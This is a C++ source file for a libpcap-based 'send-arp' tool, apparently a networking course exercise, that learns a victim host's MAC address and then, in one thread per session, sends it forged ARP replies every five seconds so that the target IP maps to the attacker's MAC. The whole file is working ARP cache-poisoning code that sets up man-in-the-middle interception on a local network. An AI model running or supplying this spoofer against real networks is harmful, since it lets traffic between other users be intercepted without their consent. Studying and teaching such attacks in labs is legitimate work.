#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <vector>
#include <thread>
#include <chrono>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMyMac(const char* dev, Mac* mac) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        return false;
    }
    *mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    close(s);
    return true;
}

bool getMyIp(const char* dev, Ip* ip) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return false;
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        return false;
    }
    *ip = Ip(ntohl((reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr))->sin_addr.s_addr));
    close(s);
    return true;
}

Mac getTargetMac(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIp);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac::nullMac();
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int res = pcap_next_ex(handle, &header, &reply_packet);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }
        EthArpPacket* arp_reply = (EthArpPacket*)reply_packet;
        if (ntohs(arp_reply->eth_.type_) == EthHdr::Arp &&
            ntohs(arp_reply->arp_.op_) == ArpHdr::Reply &&
            arp_reply->arp_.sip() == targetIp) {
            return arp_reply->arp_.smac();
        }
    }
}

void sendArpInfection(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void attackThreadFunc(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp) {
    while (true) {
        sendArpInfection(handle, myMac, senderMac, senderIp, targetIp);
        printf("ARP infection packet sent to %s (target: %s)\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());

        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }
    Mac myMac;
    if (!getMyMac(dev, &myMac)) {
        fprintf(stderr, "Failed to get MAC address for %s\n", dev);
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    printf("Attacker MAC: %s\n", std::string(myMac).c_str());

    Ip myIp;
    if (!getMyIp(dev, &myIp)) {
        fprintf(stderr, "Failed to get IP address for %s\n", dev);
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    printf("Attacker IP: %s\n", std::string(myIp).c_str());

    std::vector<std::thread> attackThreads;

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);
        printf("\n[Session %d] Resolving MAC for sender %s...\n", (i/2), std::string(senderIp).c_str());
        Mac senderMac = getTargetMac(pcap, myMac, myIp, senderIp);

        if (senderMac.isNull()) {
            fprintf(stderr, "Failed to get MAC for sender %s. Skipping this session.\n", std::string(senderIp).c_str());
            continue;
        }
        printf("Sender %s MAC: %s\n", std::string(senderIp).c_str(), std::string(senderMac).c_str());

        attackThreads.emplace_back(attackThreadFunc, pcap, myMac, senderMac, senderIp, targetIp);
    }
    printf("\nStarting ARP spoofing attacks...\n");

    for (auto& th : attackThreads) {
        th.join();
    }
    pcap_close(pcap);
    return 0;
}

